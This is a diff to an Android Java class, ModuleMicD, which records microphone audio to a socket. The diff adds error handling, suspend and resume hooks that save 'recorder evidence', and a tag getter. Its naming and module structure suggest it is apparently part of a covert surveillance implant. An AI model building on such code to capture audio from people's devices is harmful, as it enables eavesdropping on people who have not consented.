@@ -110,13 +110,14 @@ public class ModuleMicD extends ModuleMic {
 		fId = dateTime.getFiledate();
 
 		createSockets();
-		recorder = new MediaRecorder();
-		recorder.setOnErrorListener(this);
-		recorder.setOnInfoListener(this);
-		recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
-		recorder.setOutputFormat(MediaRecorder.OutputFormat.RAW_AMR);
-		recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
-		// dalla versione API 10, supporta anche AMR_WB
+		try {
+			recorder = new MediaRecorder();
+			recorder.setOnErrorListener(this);
+			recorder.setOnInfoListener(this);
+			recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
+			recorder.setOutputFormat(MediaRecorder.OutputFormat.RAW_AMR);
+			recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
+			// dalla versione API 10, supporta anche AMR_WB
 
 		/*
 		 * recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
@@ -125,10 +126,18 @@ public class ModuleMicD extends ModuleMic {
 		 * recorder.setAudioEncodingBitRate(16);
 		 * recorder.setAudioSamplingRate(44100);
 		 */
-		recorder.setOutputFile(sender.getFileDescriptor());
-		recorder.prepare();
-		recorder.start(); // Recording is now started
-
+			recorder.setOutputFile(sender.getFileDescriptor());
+			recorder.prepare();
+			recorder.start(); // Recording is now started
+		}catch (Exception e){
+			if (Cfg.EXCEPTION) {
+				Check.log(e);
+			}
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (specificStart) Exception Error: delete socket and release recorder calling stopRecorder()");//$NON-NLS-1$
+				stopRecorder();
+			}
+		}
 	}
 
 	private void createSockets() {
@@ -209,6 +218,17 @@ public class ModuleMicD extends ModuleMic {
 
 	}
 
+	@Override
+	void specificSuspend() {
+		saveRecorderEvidence();
+		stopRecorder();
+	}
+
+	@Override
+	void specificResume() {
+
+	}
+
 
 	public void onInfo(MediaRecorder mr, int what, int extra) {
 		if (Cfg.DEBUG) {
@@ -220,7 +240,10 @@ public class ModuleMicD extends ModuleMic {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (onError) Error: " + what);//$NON-NLS-1$
 		}
-		suspend();
+		base_suspend();
 	}
-
+	@Override
+	public String getTag() {
+		return TAG;
+	}
 }
